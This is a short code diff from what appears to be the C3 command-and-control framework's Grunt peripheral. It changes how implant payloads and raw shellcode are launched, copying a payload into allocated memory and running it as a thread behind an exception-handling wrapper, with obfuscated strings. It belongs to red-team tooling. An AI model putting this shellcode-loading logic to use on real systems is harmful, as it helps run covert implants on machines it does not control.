@@ -187,7 +187,7 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 	if (manualExecution != "true") {
 		if (gruntType == "binary") {
 			Log({ OBF_SEC("Binary, Automatic grunt execution"), LogMessage::Severity::DebugInformation });
-			if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SEH::SehWrapperCov), &args, 0, nullptr))
+			if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(SEH::SehWrapperCov), &args, 0, nullptr))
 				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
 		}
 		else if (gruntType == "shellcode") {
@@ -197,7 +197,8 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 				throw std::runtime_error{ OBF("Couldn't allocate mem: ") + std::to_string(GetLastError()) + OBF(".") };
 			}
 			memcpy(pa, payload.data(), payload.size());
-			if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pa), NULL, 0, nullptr))
+			DWORD(WINAPI * sehWrapper)(SEH::CodePointer) = SEH::SehWrapper;
+			if (!_beginthreadex(NULL, 0, reinterpret_cast<_beginthreadex_proc_type>(sehWrapper), pa, 0, nullptr))
 				throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
 		}
 	}
